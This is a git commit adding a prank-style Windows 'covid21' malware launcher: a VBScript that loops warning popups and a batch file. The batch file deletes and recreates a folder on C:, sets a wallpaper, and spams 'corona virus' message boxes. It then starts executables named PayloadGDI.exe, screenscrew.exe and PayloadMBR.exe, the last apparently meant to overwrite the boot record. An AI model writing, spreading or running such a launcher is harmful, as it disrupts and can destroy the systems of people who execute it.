e175839ed2d6c9c7fb12a62543cc9b3ae42baf10
ProgramistaZpolski <piotrekbadelek@gmail.com>
2021-01-04 19:50:24 +0100

    Add files via upload

---
+++ covid.vbs
@@ -0,0 +1,3 @@
+do 
+msgbox "covid21 is here! your windows will be destroyed" 
+loop 
---
+++ covid21.bat
@@ -0,0 +1,41 @@
+@echo off
+rd c:\covid21 /s /q
+md c:\covid21
+copy covid.bmp c:\covid21
+clwcp c:\covid21\covid.bmp
+echo do > covid.vbs
+echo msgbox "covid21 is here! your windows will be destroyed" >> covid.vbs
+echo loop >> covid.vbs
+start covid.vbs
+timeout 5 /nobreak
+start PayloadGDI.exe
+timeout 5 /nobreak
+start screenscrew.exe
+timeout 1 /nobreak
+echo msgbox "corona virus!" >corona.vbs
+start corona.vbs
+timeout 1 /nobreak
+start corona.vbs
+timeout 1 /nobreak
+start corona.vbs
+timeout 1 /nobreak
+start corona.vbs
+timeout 1 /nobreak
+start corona.vbs
+timeout 1 /nobreak
+start corona.vbs
+timeout 1 /nobreak
+start corona.vbs
+timeout 1 /nobreak
+start corona.vbs
+timeout 1 /nobreak
+start corona.vbs
+timeout 1 /nobreak
+start corona.vbs
+timeout 1 /nobreak
+start corona.vbs
+timeout 5 /nobreak
+echo msgbox "your windows will die from covid21 corona virus" >covid21.vbs
+start covid21.vbs
+timeout /3 /nobreak
+start PayloadMBR.exe
